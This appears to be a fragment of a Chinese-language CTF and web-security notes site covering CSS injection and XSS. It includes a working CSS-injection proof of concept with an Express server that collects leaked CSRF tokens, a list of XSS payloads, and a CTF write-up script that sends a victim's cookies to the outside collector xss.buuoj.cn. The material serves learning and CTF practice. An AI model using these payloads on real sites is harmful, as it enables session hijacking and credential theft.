<p>\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff0c\u670d\u52a1\u5668\u5982\u4f55\u6307\u793a\u524d\u7aefjs\u6784\u9020css\uff0c\u5c31\u50cf\u6211\u4eec\u4e0a\u9762\u4e3e\u5f97\u4f8b\u5b50\u7a83\u53d6\u5230\u7b2c\u4e00\u4f4d\u4e3aZ\uff0c \u90a3\u4e48\u7b2c\u4e8c\u4f4d\u7684payload\u5e94\u8be5\u662fZ\u5f00\u5934\u7684\u3002</p> <p>\u4e0b\u9762\u7684payload \u6765\u81ea\u8fd9\u91cchttps://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d</p> <p>\u5b83\u7684\u601d\u8def\u662f\u524d\u7aefjs\u4f7f\u7528setTimeout\u5b9a\u65f6\u8bf7\u6c42\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u5c06css\u6ce8\u5165\u5f97\u5230\u7684token\u8fd4\u56de\u3002</p> <pre><code>&lt;html&gt;\n    &lt;style&gt;\n        #frames {\n            visibility: hidden;\n        }\n    &lt;/style&gt;\n    &lt;body&gt;\n        &lt;div id=\"current\"&gt;&lt;/div&gt;\n        &lt;div id=\"time_to_next\"&gt;&lt;/div&gt;\n        &lt;div id=\"frames\"&gt;&lt;/div&gt;\n    &lt;/body&gt;\n    &lt;script&gt;\n        vuln_url = 'http://127.0.0.1:8084/vuln.php?css=';\n        server_receive_token_url = 'http://127.0.0.1:8083/receive/';\n        server_return_token_url = 'http://127.0.0.1:8083/return';\n        chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\".split(\"\");\n        known = \"\";\n        function test_char(known, chars) {\n            // Remove all the frames\n            document.getElementById(\"frames\").innerHTML = \"\";\n            // Append the chars with the known chars\n            css = build_css(chars.map(v =&gt; known + v));\n            // Create an iframe to try the attack. If `X-Frame-Options` is blocking this you could use a new tab...\n            frame = document.createElement(\"iframe\");\n            frame.src = vuln_url + css;\n            frame.style=\"visibility: hidden;\"; //gotta be sneaky sneaky like\n            document.getElementById(\"frames\").appendChild(frame);\n            // in 1 seconds, after the iframe loads, check to see if we got a response yet\n            setTimeout(function() {\n                var oReq = new XMLHttpRequest();\n                oReq.addEventListener(\"load\", known_listener);\n                oReq.open(\"GET\", server_return_token_url);\n                oReq.send();\n            }, 1000);\n        }\n        function build_css(values) {\n            css_payload = \"\";\n            for(var value in values) {\n                css_payload += \"input[value^=\\\"\"\n                    + values[value]\n                    + \"\\\"]~*{background-image:url(\" \n                    + server_receive_token_url\n                    + values[value]\n                    + \")%3B}\"; //can't use an actual semicolon because that has a meaning in a url\n            }\n            return css_payload;\n        }\n        function known_listener () {\n            document.getElementById(\"current\").innerHTML = \"Current Token: \" + this.responseText;\n            if(known != this.responseText) {\n                known = this.responseText;\n                test_char(known, chars);\n            } else {\n                known = this.responseText;\n                alert(\"CSRF token is: \" + known);\n            }\n        }\n        test_char(\"\", chars);\n    &lt;/script&gt;\n&lt;/html&gt;\nPlain Text\n</code></pre> <pre><code>\u670d\u52a1\u5668\u4ee3\u7801\u662f\u6211\u914d\u5408\u5b83\u7684payload\u5199\u5f97\u3002\nvar express = require('express');\nvar app = express();\nvar path = require('path');\nvar token = \"\";\napp.get('/receive/:token', function(req, res) {\n    token = req.params.token;\n    console.log(token)\n    res.send('ok');\n});\napp.get('/return', function(req, res){\n    res.send(token);\n});\napp.get('/client.html', function(req, res){\n    res.sendFile(path.join(__dirname, 'client.html'));\n})\n\nvar server = app.listen(8083, function() {\n    var host = server.address().address\n    var port = server.address().port\n    console.log(\"Example app listening at http://%s:%s\", host, port)\n})\nPlain Text\n</code></pre> <p>\u8fd8\u6709\u5e08\u5085\u901a\u8fc7\u670d\u52a1\u5668\u5c06token\u5199\u5165\u5230cookie\u4e2d\uff0c \u5b9a\u65f6\u67e5\u8be2cookie\u662f\u5426\u6539\u53d8\u6765\u5b9e\u73b0\u7684\u3002</p> <p>\u8fd8\u53d1\u73b0\u6709\u5e08\u5085\u7528websocket\u5b9e\u73b0\u66f4\u4f18\u96c5\u4e00\u4e9b\u3002https://gist.github.com/cgvwzq/f7c55222fbde44fc686b17f745d0e1aa</p>"},{"location":"web/XSS_CSS_CSP/xss/CTF%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/","title":"CTF\u4e2d\u7684\u5229\u7528\u59ff\u52bf","text":"<p>CTF\u4e2dXSS\u4e00\u822c\u9700\u8981\u53d7\u5bb3\u8005\uff0c\u9700\u8981\u540e\u53f0\u5199\u4e1c\u897f\u6765\u70b9\u51fb\uff0c\u6709\u70b9\u9ebb\u70e6\uff0c\u6240\u4ee5\u8d44\u6599\u5c11\uff0c\u9898\u76ee\u5c11</p> <p>\u4f46\u5e76\u4e0d\u4ee3\u8868\u8fd9\u4e2a\u6f0f\u6d1e\u5c11\u89c1\uff0c\u76f8\u53cd\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u5f88\u5e38\u89c1\u3002</p> <p>\u7ed9\u51fa\u4e00\u4e9b\u7b80\u5355\u7684\uff1a</p> <pre><code>&lt;script&gt;alert(\"\u5185\u5bb9\")&lt;/script&gt;    \u4f7f\u7528&lt;script&gt;\u6807\u7b7e\uff0c\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846\n&lt;body onload=alert(\"\u5185\u5bb9\")&gt;   \u4f7f\u7528&lt;body&gt;\u6807\u7b7e\uff0c\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846\n&lt;a href=\u201c\u201d onclick=alert(\u201c\u5185\u5bb9\u201d)&gt;\u94fe\u63a5\u6587\u5b57&lt;/a&gt; \u4f7f\u7528&lt;a&gt;\u6807\u7b7e\uff0c\u663e\u793a\u53ef\u70b9\u51fb\u94fe\u63a5\uff0c\u70b9\u51fb\u94fe\u63a5\u540e\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846\n&lt;img src=WrongIP onerror=alert(\"\u5185\u5bb9\")&gt;   \u4f7f\u7528&lt;img&gt;\u6807\u7b7e\uff0c\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846\n&lt;script&gt;window.location.href=\"\u7f51\u7ad9\u5730\u5740\"&lt;/script&gt;    \u4f7f\u7528&lt;script&gt;\u6807\u7b7e\uff0c\u91cd\u5b9a\u5411\u9875\u9762\n&lt;script&gt;alert=(document.cookie)&lt;/script&gt;    \u4f7f\u7528&lt;script&gt;\u6807\u7b7e\uff0ccookie\u83b7\u53d6&lt;script&gt;\u6807\u7b7e\uff1a&lt;script&gt;\u6807\u7b7e\u662f\u6700\u76f4\u63a5\u7684XSS\u6709\u6548\u8f7d\u8377\uff0c\u811a\u672c\u6807\u8bb0\u53ef\u4ee5\u5f15\u7528\u5916\u90e8\u7684JavaScript\u4ee3\u7801\uff0c\u4e5f\u53ef\u4ee5\u5c06\u4ee3\u7801\u63d2\u5165\u811a\u672c\u6807\u8bb0\u4e2d\n\nsvg\u6807\u7b7e \n&lt;svg onload=\"alert(1)\"&gt;\n&lt;svg onload=\"alert(1)\"//\n&lt;img&gt;\u6807\u7b7e\uff1a\n&lt;img  src=1  \u03bfnerr\u03bfr=alert(\"hack\")&gt;\n&lt;img  src=1  \u03bfnerr\u03bfr=alert(document.cookie)&gt;  #\u5f39\u51facookie\n &lt;body&gt;\u6807\u7b7e\uff1a\n&lt;body \u03bfnl\u03bfad=alert(1)&gt;\n&lt;body \u03bfnpagesh\u03bfw=alert(1)&gt;\nvideo\u6807\u7b7e:\n&lt;video \u03bfnl\u03bfadstart=alert(1) src=\"/media/hack-the-planet.mp4\" /&gt;\nstyle\u6807\u7b7e\uff1a\n&lt;style \u03bfnl\u03bfad=alert(1)&gt;&lt;/style&gt;\nPlain Text\n</code></pre> <p></p> <p>\u7ecf\u5e38\u7528\u7684\u5c31\u8fd9\u4e9b\u3002\u3002\u3002\u3002\u3002\u3002\u800c\u4e14\u4e5f\u57fa\u672c\u591f\u7528</p> <p>\u9898\u76ee\u7c7b\u578b\u7684\u8bdd</p> <pre><code>\u7ed9\u7ba1\u7406\u5458\u53d1\u4e00\u6761\u7559\u8a00\u597d\u5417\uff1f\u2013\u5b58\u50a8\u578bxss(\u628a\u7ba1\u7406\u5458\u7684cookie\u6253\u5230\u81ea\u5df1\u7684\u5e73\u53f0)\n\u63d0\u4ea4\u7f51\u7ad9\u6f0f\u6d1e\uff0c\u53ea\u9650\u672c\u7ad9\u5185\u7684url\uff0c\u7ba1\u7406\u5458\u4f1a\u540e\u53f0\u67e5\u770b\u2013\u53cd\u5c04\u6027DOM XSS\uff08\u4f1a\u7ed9\u51fa\u4e00\u4e9b\u63d0\u793a\u201c\u6b27\uff0c\u662f\u7684\uff0c\u6211\u4e00\u5b9a\u4f1a\u67e5\u770b\u4f60\u4eec\u53d1\u6765\u7684\u7f51\u9875\u7684\u201d--by admin\uff09\uff08\u5982\u679c\u975e\u672c\u7ad9\uff0c\u5c31\u53d8\u6210\u4e86csrf\uff09\u52a8\u6001\u6267\u884cJavaScript\u8bed\u53e5\uff0c\u66f4\u6539dom\u6811\u7ed3\u6784\u2013DOM XSS\n\u52a0\u8f7d\u56fe\u7247\u5904\uff0c\u7f16\u8f91\u7528\u6237\u540d\u5904\u2013\u53cd\u5c04\u6027XSS\n\u8fdb\u96361\u2013&gt;\u7f13\u5b58\u6295\u6bd2XSS\u2013&gt;\u83b7\u53d6\u7ba1\u7406\u5458Cookie\n\u8fdb\u96362\u2013&gt;Bypass CSP\u2013&gt;\u83b7\u53d6\u7ba1\u7406\u5458Cookie\n\u51b7\u95e8\u2013&gt;XSS to RCE\u2013&gt;\u83b7\u53d6\u7cfb\u7edfflag\nPlain Text\n</code></pre> <p>XSS\u901a\u5e38\u90fd\u662f\u7ed3\u5408\u5176\u4ed6\u65b9\u9762\u7684\u6f0f\u6d1e\u6765\u5229\u7528</p> <p>\u6765\u7ec3\u4e60\u7ec3\u4e60\uff1f</p> <p>XSS\u5e73\u53f0|CTF\u6b22\u8fce\u6765\u5230XSS\u6311\u6218|XSS\u4e4b\u65c5|XSS\u6d4b\u8bd5</p> <p>XSS\u5e73\u53f0\uff0c\u4e3a\u54cd\u5e94\u56fd\u5bb6\u53f7\u53ec\uff0c\u5efa\u8bbe\u4e92\u8054\u7f51\u5b89\u5168\u5f3a\u56fd\uff0c\u6253\u9020\u5168\u6c11\u7f51\u7edc\u5b89\u5168\u5c16\u5175\uff0c\u6211\u4eec\u7279\u610f\u514d\u8d39\u7ed9\u767d\u5e3d\u5b50\u63d0\u4f9b\u4e86\u6e17\u900f\u6d4b\u8bd5\u4e13\u7528\u7684XSS\u5e73\u53f0\u3002\u6211\u4eec\u7684\u53e3\u53f7\u662f\uff0c\u77e5\u8bc6\uff0c\u4e0d\u4f1a\u56e0\u4e3a\u4f60\u7684\u5206\u4eab\u800c\u843d\u540e\u4e8e\u522b\u4eba\uff0c\u5979\u53ea\u4f1a\u8ba9\u4f60\u66f4\u8fdb\u6b65\uff0c\u4e2d\u534e\u6c11\u65cf\uff0c\u534e\u590f\u513f\u5973\uff0c\u56e2\u7ed3\u8d77\u6765\uff0c\u5171\u7b51\u4e2d\u56fd\u7f51\u7edc\u5b89\u5168\u957f\u57ce\uff01</p> <p>http://test.xss.tv/</p> <p>\u5176\u4ed6\u7ed5\u8fc7\u7684\u8bdd\uff0c\u672c\u4eba\u59ff\u52bf\u4e0d\u591f\uff0c\u671f\u5f85\u8865\u5145</p> <p>XSS\u63d2\u5165\u7ed5\u8fc7\u4e00\u4e9b\u65b9\u5f0f\u603b\u7ed3_weixin_38167826\u7684\u535a\u5ba2-CSDN\u535a\u5ba2</p> <p>\u8be6\u89c1\uff1ahttp://blog.csdn.net/keepxp/article/details/520543881\u5e38\u89c4\u63d2\u5165\u53ca\u5176\u7ed5\u8fc71.1 Script \u6807\u7b7e\u7ed5\u8fc7\u8fdb\u884c\u4e00\u6b21\u79fb\u9664\u64cd\u4f5c\uff1a &lt;scr&lt;script&gt;ipt&gt;alert(\"XSS\")&lt;/scr&lt;script&gt;ipt&gt; Script \u6807\u7b7e\u53ef\u4ee5\u7528\u4e8e\u5b9a\u4e49\u4e00\u4e2a\u884c\u5185\u7684\u811a\u672c\u6216\u8005\u4ece\u5176...</p> <p>https://blog.csdn.net/weixin_38167826/article/details/99759505</p>"},{"location":"web/XSS_CSS_CSP/xss/CTF%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/#markup","title":"markup\u8f6c\u7801","text":"<p>Markup\u65b9\u6cd5\u662f\u5bf9HTML\u7684\u4e00\u79cd\u5b89\u5168\u6807\u8bb0\uff0c\u5e76\u5c06\u5176\u8f6c\u5316\u4e3astr\u7c7b\u578b</p> <p>\u5176\u76ee\u7684\u662f\u4e3a\u4e86\u9632\u6b62XSS\u653b\u51fb</p> <p>\u62ff\u4e2a\u4f8b\u9898\u51fa\u6765</p> <p>[CISCN-\u534e\u4e1c\u5317\u8d5b\u533aWeb]-XSS</p> <p></p> <p></p> <p>OK,\u5173\u952e\u5b57\uff0cadmin\u5927\u4eba\u7684\u5ba1\u6838</p> <p></p> <p>\u8fd8\u6709URL\u53ef\u4ee5\u63d0\u4ea4</p> <p>\u81f3\u4e8e\u4e0b\u9762\u7684\u4f1a\u7528\u5230\u811a\u672c\uff1amd5\u622a\u65ad\u7206\u7834</p> <p>\u7ed3\u5408\u6807\u9898\u518d\u770b\u770b\u8fd9\u4e24\u4e2a\u9875\u9762\uff0c\u6295\u7a3f\u9875\u9762\u662f\u7528\u6765\u653eXSS\u7684\uff0c\u7136\u540e\u5728\u53cd\u9988\u7ed9\u7ba1\u7406\u5458\u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u62ff\u5230\u7ba1\u7406\u5458\u7684cookie\uff0c\u56e0\u4e3a\u8fd9\u91cc\u662f\u5185\u7f51\u73af\u5883\uff0c\u6240\u4ee5\u53ea\u80fd\u53bbhttp://xss.buuoj.cn\u6ce8\u518c\u8d26\u53f7\u6765\u63a5\u6536cookie\u3002</p> <p>\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u63d0\u4ea4\u7684\u5185\u5bb9\u90e8\u5206\u4f1a\u88ab\u8f6c\u4e49\uff0c\u53ef\u4ee5\u5148\u5c06\u63d0\u4ea4\u7684\u5185\u5bb9\u7528HTML Markup\u8f6c\u4e2a\u7801\uff0c\u7136\u540e\u7528eval\u6765\u6267\u884cJS\u4ee3\u7801\uff0c\u800c\u4e14\u8fd9\u91cc\u9700\u8981\u7528window.location.href\u6765\u5237\u65b0\u9875\u9762\u81ea\u52a8\u89e6\u53d1\u3002</p> <p>markup\u8f6c\u7801\u811a\u672c</p> <pre><code>import markup\nxss =\"(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=odd1Xf&amp;location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&amp;toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&amp;cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&amp;opener='+escape((function(){try{return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();\"\noutput = \"\"\nfor c in xss:\n    output += \"&amp;#\" + str(ord(c))\nprint(\"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34\" + output + \"&amp;#34&amp;#41&lt;/script&gt;\")\nPlain Text\n</code></pre> <p>\u5728\u7f51\u7ad9\u4e0a\u63a5\u53d7\u5230\u5f39\u56de\u6765\u7684cookie\u540e\uff0c\u5229\u7528cookie\u767b\u5f55\uff0cOK</p> <p>\u540e\u9762\u8fd8\u6709\u4e2asql\u6ce8\u5165\uff0c\u4e0d\u8fc7\u6ca1\u8fc7\u6ee4\uff0c\u975e\u5e38\u7b80\u5355\u3002</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/","title":"XSS","text":"<p>\u5176\u5b9e\u6211\u662f\u60f3\u548cCSRF\u653e\u5728\u4e00\u8d77\u7684\uff0c\u6bd5\u7adf\u5f88\u50cf</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#cross-site-scripting","title":"\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08Cross Site Scripting\uff09","text":"<p>\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08XSS\uff09\uff0c\u662f\u6700\u666e\u904d\u7684Web\u5e94\u7528\u5b89\u5168\u6f0f\u6d1e\u3002\u8fd9\u7c7b\u6f0f\u6d1e\u80fd\u591f\u4f7f\u5f97\u653b\u51fb\u8005\u5d4c\u5165\u6076\u610f\u811a\u672c\u4ee3\u7801\u5230\u6b63\u5e38\u7528\u6237\u4f1a\u8bbf\u95ee\u5230\u7684\u9875\u9762\u4e2d\uff0c\u5f53\u6b63\u5e38\u7528\u6237\u8bbf\u95ee\u8be5\u9875\u9762\u65f6\uff0c\u5219\u53ef\u5bfc\u81f4\u5d4c\u5165\u7684\u6076\u610f\u811a\u672c\u4ee3\u7801\u7684\u6267\u884c\uff0c\u4ece\u800c\u8fbe\u5230\u6076\u610f\u653b\u51fb\u7528\u6237\u7684\u76ee\u7684\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u6237\u5728\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u5176\u9884\u5b9a\u4e49\u7684\u6076\u610f\u811a\u672c\uff0c\u5176\u5bfc\u81f4\u7684\u5371\u5bb3\u53ef\u60f3\u800c\u77e5\uff0c\u5982\u52ab\u6301\u7528\u6237\u4f1a\u8bdd\uff0c\u63d2\u5165\u6076\u610f\u5185\u5bb9\u3001\u91cd\u5b9a\u5411\u7528\u6237\u3001\u4f7f\u7528\u6076\u610f\u8f6f\u4ef6\u52ab\u6301\u7528\u6237\u6d4f\u89c8\u5668\u3001\u7e41\u6b96XSS\u8815\u866b\uff0c\u751a\u81f3\u7834\u574f\u7f51\u7ad9\u3001\u4fee\u6539\u8def\u7531\u5668\u914d\u7f6e\u4fe1\u606f\u7b49\u3002</p> <p>\u4e5f\u6709\u4eba\u8bf4\u8fd9\u4e2a\u6f0f\u6d1e\u6316\u6398\u5c31\u662f\u770b\u4f60JS\u597d\u4e0d\u597d</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#_1","title":"\u539f\u7406","text":"<p>HTML\u662f\u4e00\u79cd\u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00\uff0c\u901a\u8fc7\u5c06\u4e00\u4e9b\u5b57\u7b26\u7279\u6b8a\u5730\u5bf9\u5f85\u6765\u533a\u522b\u6587\u672c\u548c\u6807\u8bb0\uff0c\u4f8b\u5982\uff0c\u5c0f\u4e8e\u7b26\u53f7\uff08&lt;\uff09\u88ab\u770b\u4f5c\u662fHTML\u6807\u7b7e\u7684\u5f00\u59cb\uff0c\u4e0e\u4e4b\u95f4\u7684\u5b57\u7b26\u662f\u9875\u9762\u7684\u6807\u9898\u7b49\u7b49\u3002\u5f53\u52a8\u6001\u9875\u9762\u4e2d\u63d2\u5165\u7684\u5185\u5bb9\u542b\u6709\u8fd9\u4e9b\u7279\u6b8a\u5b57\u7b26\uff08\u5982&lt;\uff09\u65f6\uff0c\u7528\u6237\u6d4f\u89c8\u5668\u4f1a\u5c06\u5176\u8bef\u8ba4\u4e3a\u662f\u63d2\u5165\u4e86HTML\u6807\u7b7e\uff0c\u5f53\u8fd9\u4e9bHTML\u6807\u7b7e\u5f15\u5165\u4e86\u4e00\u6bb5JavaScript\u811a\u672c\u65f6\uff0c\u8fd9\u4e9b\u811a\u672c\u7a0b\u5e8f\u5c31\u5c06\u4f1a\u5728\u7528\u6237\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u3002\u6240\u4ee5\uff0c\u5f53\u8fd9\u4e9b\u7279\u6b8a\u5b57\u7b26\u4e0d\u80fd\u88ab\u52a8\u6001\u9875\u9762\u68c0\u67e5\u6216\u68c0\u67e5\u51fa\u73b0\u5931\u8bef\u65f6\uff0c\u5c31\u5c06\u4f1a\u4ea7\u751fXSS\u6f0f\u6d1e\u3002</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#_2","title":"\u7c7b\u578b","text":"<p>\u4ece\u653b\u51fb\u4ee3\u7801\u7684\u5de5\u4f5c\u65b9\u5f0f\u53ef\u4ee5\u5206\u4e3a\u4e09\u4e2a\u7c7b\u578b\uff1a</p> <p>\uff081\uff09\u6301\u4e45\u578b\u8de8\u7ad9\uff1a\u6700\u76f4\u63a5\u7684\u5371\u5bb3\u7c7b\u578b\uff0c\u8de8\u7ad9\u4ee3\u7801\u5b58\u50a8\u5728\u670d\u52a1\u5668\uff08\u6570\u636e\u5e93\uff09\u3002</p> <p>\uff082\uff09\u975e\u6301\u4e45\u578b\u8de8\u7ad9\uff1a\u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\uff0c\u6700\u666e\u904d\u7684\u7c7b\u578b\u3002\u7528\u6237\u8bbf\u95ee\u670d\u52a1\u5668-\u8de8\u7ad9\u94fe\u63a5-\u8fd4\u56de\u8de8\u7ad9\u4ee3\u7801\u3002</p> <p>\uff083\uff09DOM\u8de8\u7ad9\uff08DOM XSS\uff09\uff1aDOM\uff08document object model\u6587\u6863\u5bf9\u8c61\u6a21\u578b\uff09\uff0c\u5ba2\u6237\u7aef\u811a\u672c\u5904\u7406\u903b\u8f91\u5bfc\u81f4\u7684\u5b89\u5168\u95ee\u9898\u3002</p> <p>\u57fa\u4e8eDOM\u7684XSS\u6f0f\u6d1e\u662f\u6307\u53d7\u5bb3\u8005\u7aef\u7684\u7f51\u9875\u811a\u672c\u5728\u4fee\u6539\u672c\u5730\u9875\u9762DOM\u73af\u5883\u65f6\u672a\u8fdb\u884c\u5408\u7406\u7684\u5904\u7f6e\uff0c\u800c\u4f7f\u5f97\u653b\u51fb\u811a\u672c\u88ab\u6267\u884c\u3002\u5728\u6574\u4e2a\u653b\u51fb\u8fc7\u7a0b\u4e2d\uff0c\u670d\u52a1\u5668\u54cd\u5e94\u7684\u9875\u9762\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316\uff0c\u5f15\u8d77\u5ba2\u6237\u7aef\u811a\u672c\u6267\u884c\u7ed3\u679c\u5dee\u5f02\u7684\u539f\u56e0\u662f\u5bf9\u672c\u5730DOM\u7684\u6076\u610f\u7be1\u6539\u5229\u7528\u3002</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#_3","title":"\u653b\u51fb\u65b9\u5f0f","text":"<p>\u5e38\u7528\u7684XSS\u653b\u51fb\u624b\u6bb5\u548c\u76ee\u7684\u6709\uff1a</p> <p>1\u3001\u76d7\u7528cookie\uff0c\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u3002</p> <p>2\u3001\u5229\u7528\u690d\u5165Flash\uff0c\u901a\u8fc7crossdomain\u6743\u9650\u8bbe\u7f6e\u8fdb\u4e00\u6b65\u83b7\u53d6\u66f4\u9ad8\u6743\u9650\uff1b\u6216\u8005\u5229\u7528Java\u7b49\u5f97\u5230\u7c7b\u4f3c\u7684\u64cd\u4f5c\u3002</p> <p>3\u3001\u5229\u7528iframe\u3001frame\u3001XMLHttpRequest\u6216\u4e0a\u8ff0Flash\u7b49\u65b9\u5f0f\uff0c\u4ee5\uff08\u88ab\u653b\u51fb\uff09\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u4e00\u4e9b\u7ba1\u7406\u52a8\u4f5c\uff0c\u6216\u6267\u884c\u4e00\u4e9b\u4e00\u822c\u7684\u5982\u53d1\u5fae\u535a\u3001\u52a0\u597d\u53cb\u3001\u53d1\u79c1\u4fe1\u7b49\u64cd\u4f5c\u3002</p> <p>4\u3001\u5229\u7528\u53ef\u88ab\u653b\u51fb\u7684\u57df\u53d7\u5230\u5176\u4ed6\u57df\u4fe1\u4efb\u7684\u7279\u70b9\uff0c\u4ee5\u53d7\u4fe1\u4efb\u6765\u6e90\u7684\u8eab\u4efd\u8bf7\u6c42\u4e00\u4e9b\u5e73\u65f6\u4e0d\u5141\u8bb8\u7684\u64cd\u4f5c\uff0c\u5982\u8fdb\u884c\u4e0d\u5f53\u7684\u6295\u7968\u6d3b\u52a8\u3002</p> <p>5\u3001\u5728\u8bbf\u95ee\u91cf\u6781\u5927\u7684\u4e00\u4e9b\u9875\u9762\u4e0a\u7684XSS\u53ef\u4ee5\u653b\u51fb\u4e00\u4e9b\u5c0f\u578b\u7f51\u7ad9\uff0c\u5b9e\u73b0DDoS\u653b\u51fb\u7684\u6548\u679c\u3002</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#_4","title":"XSS","text":"<p>\uff08\u4ee5\u4e0a\u6458\u81ea\u767e\u5ea6\u767e\u79d1\uff09</p> <p>\u60f3\u8c61\u4e00\u4e0b\uff0c\u5f53\u6709\u4e00\u5929\u4f60\u6b63\u5728\u7f51\u5361\u5feb\u4e50\u7684\u51b2\u7740\u6d6a\uff0c\u521a\u521a\u53d1\u5230\u5de5\u8d44\u7684\u4f60\u767b\u5f55\u4e86XX\u94f6\u884c\u7684\u7f51\u7ad9\uff0c\u7f51\u9875\u53f3\u4e0b\u89d2\u7a81\u7136\u5f39\u51fa\u4e00\u4e2a\u4e0d\u8d77\u773c\u7684\u5f39\u6846\uff0c\u4f60\u70b9\u51fb\u5b83\u60f3\u628a\u5b83\u5173\u6389\u7ed3\u679c\u4e0d\u5c0f\u5fc3\u6253\u5f00\u3002\u7136\u540e\u7a81\u7136\u4f20\u51fa\u6d88\u606f\uff1a\u4f60\u5df2\u8f6c\u8d26XXX\u5143.......</p> <p>\u603b\u7684\u6765\u8bf4XSS\u6f0f\u6d1e\u5371\u5bb3\u6027\u8fd8\u662f\u86ee\u5927\u7684\u3002\u540c\u6837\u7684\uff0c\u6211\u4eec\u4e5f\u9762\u4e34\u7740\u5f3a\u5927\u7684\u5404\u79cd\u8fc7\u6ee4\u624b\u6bb5\u3002</p> <p>\u5982\u4f55\u7ed5\u8fc7\u8fd9\u4e9b\u624b\u6bb5\u662f\u6211\u4eec\u7684\u5b66\u4e60\u7684\u76ee\u7684\u3002</p> <p></p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#xss_1","title":"XSS\u7684\u4e09\u79cd\u65b9\u6cd5","text":"<p>XSS\u7684\u7b80\u4ecb</p> <p>\u60f3\u5b66\u4e60\u7684\u8bdd\u62ffDVWA\u53ef\u4ee5\u81ea\u5df1\u6162\u6162\u8bd5</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#xss_2","title":"\u53cd\u5c04\u578bxss","text":"<p>\u53cd\u5c04XSS\u662fXSS\u5206\u7c7b\u4e2d\u6700\u591a\u7684\uff0c\u4ed6\u4eec\u539f\u7406\u662f\u4e0b\u9762\u8fd9\u6837\uff1a</p> <p>Hacker\u2014\u2014\u53d1\u73b0\u5b58\u5728\u53cd\u5c04XSS\u7684URL\u2014\u2014\u6839\u636e\u8f93\u51fa\u70b9\u7684\u73af\u5883\u6784\u9020XSS\u4ee3\u7801\u2014\u2014\u8fdb\u884c\u7f16\u7801\u3001\u7f29\u77ed(\u53ef\u6709\u53ef\u65e0\uff0c\u662f\u4e3a\u4e86\u589e\u52a0\u8ff7\u60d1\u6027)\u2014\u2014\u53d1\u9001\u7ed9\u53d7\u5bb3\u4eba\u2014\u2014\u53d7\u5bb3\u6253\u5f00\u540e\uff0c\u6267\u884cXSS\u4ee3\u7801\u2014\u2014\u5b8c\u6210hacker\u60f3\u8981\u7684\u529f\u80fd(\u83b7\u53d6cookies\u3001url\u3001\u6d4f\u89c8\u5668\u4fe1\u606f\u3001IP\u7b49\u7b49)</p> <p>\u6253\u4e2a\u6bd4\u65b9\uff1a</p> <p>A\u7f51\u7ad9\u6709\u4e2aXSS\uff0c\u9ed1\u5ba2\u5199\u4e86\u4e00\u4e2aB\u7f51\u7ad9\uff0c\u53d7\u5bb3\u8005\u8bbf\u95eeB\u7f51\u7ad9\u7684\u65f6\u5019\u4f1a\u8df3\u5230A\u7f51\u7ad9\u5e76\u4e14\u8fd4\u56de\u4fe1\u606f\u7ed9\u9ed1\u5ba2\u3002</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#xss_3","title":"\u5b58\u50a8\u578bXSS","text":"<p>\u5229\u7528\u90fd\u662f\u63d2\u5165\u4ee3\u7801\u5230HTML\u4e4b\u4e2d\uff0c\u53cd\u5c04\u578b\u662f\u4e00\u90e8\u5206\uff0c\u7b49\u7740\u9493\u9c7c\u3002</p> <p>\u5b58\u50a8\u578b\u5c31\u7b49\u7740\u522b\u4eba\u70b9\u8fd9\u4e2a\u7f51\u9875\u5c31\u884c\u4e86\u3002</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#domxss","title":"DOM\u578bXSS","text":"<p>DOM\uff0c\u5168\u79f0Document Object Model\uff0c\u662f\u4e00\u4e2a\u5e73\u53f0\u548c\u8bed\u8a00\u90fd\u4e2d\u7acb\u7684\u63a5\u53e3\uff0c\u53ef\u4ee5\u4f7f\u7a0b\u5e8f\u548c\u811a\u672c\u80fd\u591f\u52a8\u6001\u8bbf\u95ee\u548c\u66f4\u65b0\u6587\u6863\u7684\u5185\u5bb9\u3001\u7ed3\u6784\u4ee5\u53ca\u6837\u5f0f\u3002</p> <p></p> 